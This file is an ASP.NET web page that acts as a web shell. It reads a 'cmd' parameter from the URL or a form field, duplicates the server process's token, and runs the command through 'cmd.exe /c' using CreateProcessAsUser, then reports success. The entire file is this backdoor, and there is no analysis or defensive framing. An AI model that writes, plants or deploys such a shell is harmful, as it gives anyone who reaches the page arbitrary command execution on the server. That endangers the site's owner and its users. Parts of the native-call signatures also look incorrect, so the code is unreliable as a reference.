<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine,
                                            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
                                            bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
                                            string lpCurrentDirectory, byte[] lpStartupInfo, out byte[] lpProcessInformation);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,
                                         uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("advapi32.dll")]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (string.IsNullOrEmpty(cmd)) return;

        IntPtr hToken, hDupToken;
        OpenProcessToken(GetCurrentProcess(), 0x0008, out hToken);
        DuplicateTokenEx(hToken, 0x1FFFFF, IntPtr.Zero, 2, 1, out hDupToken);
        byte[] si = new byte[68];
        byte[] pi = new byte[16];
        bool success = CreateProcessAsUser(hDupToken, null, "cmd.exe /c " + cmd, IntPtr.Zero, IntPtr.Zero,
                                           false, 0x08000000, IntPtr.Zero, null, si, out pi);
        Response.Write(success ? "CreateProcessAsUser executed (impersonation)." : "Failed");
    }
</script>
<html><body><h2>CreateProcessAsUser (token impersonation)</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
